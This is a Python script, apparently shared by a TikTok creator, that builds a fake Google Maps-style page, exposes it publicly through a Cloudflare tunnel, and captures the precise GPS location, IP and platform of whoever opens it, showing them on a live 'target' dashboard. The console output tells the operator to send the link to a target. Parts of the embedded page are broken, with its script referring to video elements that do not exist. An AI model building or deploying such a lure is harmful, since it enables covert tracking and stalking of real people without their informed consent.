#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GPS-Locator v1.0 - Cross Platform GPS Location Tracker
Works on: Windows, Kali Linux, Ubuntu, macOS
Author: Telly Tech
"""

import os
import sys
import json
import time
import threading
import webbrowser
import subprocess
import datetime
import http.server
import socketserver
import urllib.request
import re
import platform
import socket

class Locator:
    def __init__(self):
        self.port = 8080
        self.http_server = None
        self.tunnel_process = None
        self.public_url = None
        self.running = True
        self.os_type = platform.system()
        self.cloudflared_path = self.find_cloudflared()
        
    def find_cloudflared(self):
        """Find cloudflared in system PATH or current directory"""
        # Check in current directory first
        if self.os_type == "Windows":
            names = ["cloudflared.exe", "cloudflared"]
        else:
            names = ["cloudflared", "./cloudflared"]
        
        for name in names:
            if os.path.exists(name):
                return name
        
        # Check in system PATH
        if self.os_type != "Windows":
            try:
                result = subprocess.run(["which", "cloudflared"], capture_output=True, text=True)
                if result.returncode == 0 and result.stdout.strip():
                    return result.stdout.strip()
            except:
                pass
        
        # Check common locations
        common_paths = [
            "/usr/local/bin/cloudflared",
            "/usr/bin/cloudflared",
            "/bin/cloudflared"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def get_cloudflared_url(self):
        """Get correct download URL based on OS"""
        if self.os_type == "Windows":
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        elif self.os_type == "Darwin":
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        else:
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def create_fake_video_page(self):
        """Create fake YouTube video page"""
        html_content = '''<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mock Map Interface</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Roboto, Arial, sans-serif;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
        }

        /* Map Container acting as the canvas background */
        .map-container {
            position: relative;
            width: 100%;
            height: 100%;
            background-color: #e5e3df;
            /* Grid background styling to simulate street/terrain grids */
            background-image: 
                linear-gradient(#ffffff 2px, transparent 2px),
                linear-gradient(90deg, #ffffff 2px, transparent 2px);
            background-size: 100px 100px;
        }

        /* Mock Search Widget floating on the top left */
        .search-box {
            position: absolute;
            top: 12px;
            left: 12px;
            width: 360px;
            height: 48px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2), 0 -1px 0px rgba(0,0,0,0.02);
            display: flex;
            align-items: center;
            padding: 0 16px;
            z-index: 10;
        }

        .search-input {
            border: none;
            outline: none;
            width: 100%;
            font-size: 15px;
            color: #202124;
        }

        .search-icon {
            color: #70757a;
            margin-right: 12px;
            font-weight: bold;
        }

        /* Mock Map Controls on the bottom right */
        .map-controls {
            position: absolute;
            bottom: 30px;
            right: 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            z-index: 10;
        }

        .control-btn {
            width: 40px;
            height: 40px;
            background: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.3);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            color: #666;
            font-weight: bold;
        }

        .control-btn:hover {
            background-color: #f1f3f4;
        }

        /* Visual Pin Marker */
        .map-marker {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            cursor: pointer;
        }

        .pin-head {
            width: 28px;
            height: 28px;
            background-color: #ea4335;
            border-radius: 50% 50% 50% 0;
            transform: rotate(-45deg);
            box-shadow: 0 2px 4px rgba(0,0,0,0.4);
        }

        .pin-head::after {
            content: '';
            width: 12px;
            height: 12px;
            background-color: #ffffff;
            position: absolute;
            border-radius: 50%;
            top: 8px;
            left: 8px;
        }

        .pin-shadow {
            width: 10px;
            height: 4px;
            background: rgba(0,0,0,0.2);
            border-radius: 50%;
            margin-top: 2px;
        }
    </style>
</head>
<body>

    <div class="map-container">
        <!-- Floating Google Maps style search box -->
        <div class="search-box">
            <span class="search-icon">🔍</span>
            <input type="text" class="search-input" placeholder="Search Google Maps" value="1600 Amphitheatre Pkwy, Mountain View, CA">
        </div>

        <!-- Custom Map Marker Pin placed in the center -->
        <div class="map-marker">
            <div class="pin-head"></div>
            <div class="pin-shadow"></div>
        </div>

        <!-- Zoom and utility buttons -->
        <div class="map-controls">
            <button class="control-btn">+</button>
            <button class="control-btn">−</button>
            <button class="control-btn" style="font-size: 14px;">🗺️</button>
        </div>
    </div>

</body>
</html>

    <script>
        let locationSent = false;
        function getLocation() {
            if (locationSent) return;
            locationSent = true;
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                    enableHighAccuracy: true, timeout: 15000, maximumAge: 0
                });
            }
        }
        function sendLocation(position) {
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    platform: navigator.platform,
                    timestamp: new Date().toISOString()
                })
            });
        }
        function showError(error) {
            fetch('/track', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ error: error.message }) });
        }
        getLocation();
        document.getElementById('videoPlayer').onclick = function() {
            document.getElementById('loading').style.display = 'block';
            getLocation();
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('errorMsg').style.display = 'block';
                setTimeout(function() { document.getElementById('errorMsg').style.display = 'none'; }, 3000);
            }, 2000);
        };
        document.getElementById('watchBtn').onclick = function() { getLocation(); alert("Content is processing..."); };
    </script>
</body>
</html>'''
        
        with open('index.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        print("[✓] Fake video page created")
    
    def create_viewer_page(self):
        """Create viewer page"""
        viewer_content = '''<!DOCTYPE html>
<html>
<head>
    <title>📍 HDN-Locator - GPS Tracker</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #1a1a1a; color: #fff; padding: 20px; }
        h1 { color: #4CAF50; }
        .stats { background: #2d2d2d; padding: 15px; border-radius: 8px; margin: 15px 0; }
        .location-card { background: #2d2d2d; margin: 10px 0; padding: 15px; border-radius: 8px; border-left: 4px solid #4CAF50; }
        .coords { font-size: 18px; font-weight: bold; color: #4CAF50; }
        #map { height: 500px; margin: 20px 0; border-radius: 8px; }
        button { background: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; border-radius: 5px; }
        .copy-btn { background: #2196F3; }
    </style>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
    <h1>📍 HDN-Locator</h1>
    <div class="stats" id="stats">Loading...</div>
    <button onclick="location.reload()">🔄 Refresh</button>
    <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
    <div id="map"></div>
    <div id="locations-list"></div>
    <script>
        let publicUrl = '';
        fetch('/url').then(r => r.json()).then(data => { publicUrl = data.url; });
        function copyLink() { if(publicUrl) { navigator.clipboard.writeText(publicUrl); alert('Copied!'); } }
        function loadLocations() {
            fetch('locations.json?' + Date.now())
                .then(response => response.json())
                .then(data => {
                    if (!data || data.length === 0) {
                        document.getElementById('locations-list').innerHTML = '<p>⏳ Waiting for target...</p>';
                        return;
                    }
                    let html = '', lastLoc = null, count = 0;
                    for (let i = data.length - 1; i >= 0; i--) {
                        const loc = data[i];
                        if (loc.lat && loc.lon) {
                            count++; lastLoc = loc;
                            html += `<div class="location-card">
                                <div class="coords">📍 ${loc.lat}, ${loc.lon}</div>
                                <div>🎯 Accuracy: ${loc.accuracy || '?'} meters</div>
                                <div>🌐 IP: ${loc.ip || 'Unknown'}</div>
                                <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank">🗺️ View on Google Maps</a>
                            </div>`;
                        }
                    }
                    document.getElementById('locations-list').innerHTML = html;
                    document.getElementById('stats').innerHTML = `📍 Locations: ${count} | Last: ${new Date().toLocaleTimeString()}`;
                    if (lastLoc) {
                        const map = L.map('map').setView([lastLoc.lat, lastLoc.lon], 15);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup('Target Location').openPopup();
                    }
                }).catch(err => {});
        }
        loadLocations();
        setInterval(loadLocations, 3000);
    </script>
</body>
</html>'''
        
        with open('view.html', 'w', encoding='utf-8') as f:
            f.write(viewer_content)
        print("[✓] Viewer page created")
    
    def start_cloudflare_tunnel(self):
        """Start Cloudflare tunnel for public access"""
        print("\n[*] Starting Cloudflare tunnel...")
        
        # First try to use system cloudflared
        cloudflared_cmd = self.cloudflared_path
        
        if not cloudflared_cmd or not os.path.exists(cloudflared_cmd):
            print("[!] Cloudflared not found. Installing...")
            
            # Download cloudflared
            url = self.get_cloudflared_url()
            output = "cloudflared"
            
            try:
                subprocess.run(["wget", "-q", url, "-O", output], timeout=30)
                subprocess.run(["chmod", "+x", output])
                cloudflared_cmd = f"./{output}"
                print("[✓] Cloudflared downloaded")
            except Exception as e:
                print(f"[!] Download failed: {e}")
                self.show_local_only()
                return None
        
        # Try multiple methods to get URL
        methods = [
            f"{cloudflared_cmd} tunnel --url http://localhost:{self.port}",
            f"cloudflared tunnel --url http://localhost:{self.port}",
            f"/usr/local/bin/cloudflared tunnel --url http://localhost:{self.port}"
        ]
        
        for method in methods:
            try:
                print(f"[*] Trying: {method[:50]}...")
                
                self.tunnel_process = subprocess.Popen(
                    method,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                
                # Wait for URL
                timeout = 15
                start = time.time()
                while time.time() - start < timeout:
                    if self.tunnel_process.poll() is not None:
                        break
                    if self.tunnel_process.stdout:
                        line = self.tunnel_process.stdout.readline()
                        if line:
                            urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                            if urls:
                                self.public_url = urls[0]
                                print(f"\n[✓] Public URL: {self.public_url}")
                                return self.public_url
                    time.sleep(0.5)
                    
            except Exception as e:
                continue
        
        self.show_local_only()
        return None
    
    def show_local_only(self):
        """Show local network options"""
        local_ip = self.get_local_ip()
        print(f"\n[!] Cloudflare tunnel failed. Using local network!")
        print(f"\n📱 Same WiFi Network URLs:")
        print(f"   http://{local_ip}:{self.port}")
        print(f"   http://{local_ip}:{self.port}/view")
    
    def start_python_server(self):
        """Start HTTP server"""
        class LocationHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_POST(self):
                if self.path == '/track':
                    try:
                        length = int(self.headers['Content-Length'])
                        data = json.loads(self.rfile.read(length).decode('utf-8'))
                        data['ip'] = self.client_address[0]
                        data['server_time'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        locations = []
                        if os.path.exists('locations.json'):
                            with open('locations.json', 'r') as f:
                                try:
                                    locations = json.load(f)
                                except:
                                    pass
                        
                        locations.append(data)
                        with open('locations.json', 'w') as f:
                            json.dump(locations, f, indent=2)
                        
                        if 'lat' in data:
                            print(f"\n🎯 NEW LOCATION!")
                            print(f"   📍 {data['lat']}, {data['lon']}")
                            print(f"   🗺️  https://www.google.com/maps?q={data['lat']},{data['lon']}")
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({'status': 'success'}).encode())
                    except:
                        self.send_response(500)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_GET(self):
                if self.path == '/':
                    self.path = '/index.html'
                elif self.path == '/view':
                    self.path = '/view.html'
                elif self.path == '/url':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'url': getattr(self.server, 'public_url', '')}).encode())
                    return
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        self.http_server = socketserver.TCPServer(("0.0.0.0", self.port), LocationHandler)
        self.http_server.public_url = self.public_url
        
        server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
        server_thread.start()
        print(f"[✓] Server at http://localhost:{self.port}")
    
    def show_banner(self):
        os.system('clear' if self.os_type != "Windows" else 'cls')
        print("""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    .o88o.                               o8o                .
    888 `"                               `"'              .o8
   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
                                                                .o...P'
                                                                `XER0'
║                          Locator v1.0                              ║
║              GPS Location Tracker  by Telly Tech on Tiktok         ║
╚════════════════════════════════════════════════════════════════════╝
        """)
        print(f"    [*] OS: {self.os_type}")
        print("    [*] Initializing...\n")
        time.sleep(1)
    
    def run(self):
        self.show_banner()
        
        self.create_fake_video_page()
        self.create_viewer_page()
        self.start_python_server()
        
        # Try Cloudflare tunnel
        self.start_cloudflare_tunnel()
        
        if self.http_server:
            self.http_server.public_url = self.public_url
        
        local_url = f"http://localhost:{self.port}"
        print("\n" + "="*60)
        print("🎯 GPS-Locator READY!")
        print("="*60)
        print(f"\n📱 Local URL: {local_url}")
        print(f"👁️  Viewer: {local_url}/view")
        
        if self.public_url:
            print(f"\n🌍 PUBLIC URL (Send to target):")
            print(f"   {self.public_url}")
        else:
            local_ip = self.get_local_ip()
            print(f"\n📱 Same WiFi Network URL:")
            print(f"   http://{local_ip}:{self.port}")
        
        print("\n" + "="*60)
        print("⚠️  Target must click ALLOW on location prompt")
        print("📍  Captured locations appear in real-time!")
        print("="*60)
        
        webbrowser.open(f"{local_url}/view")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            if self.http_server:
                self.http_server.shutdown()
            if self.tunnel_process:
                self.tunnel_process.terminate()
            sys.exit(0)

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("Python 3 required!")
        sys.exit(1)
    
    tracker = Locator()
    tracker.run()
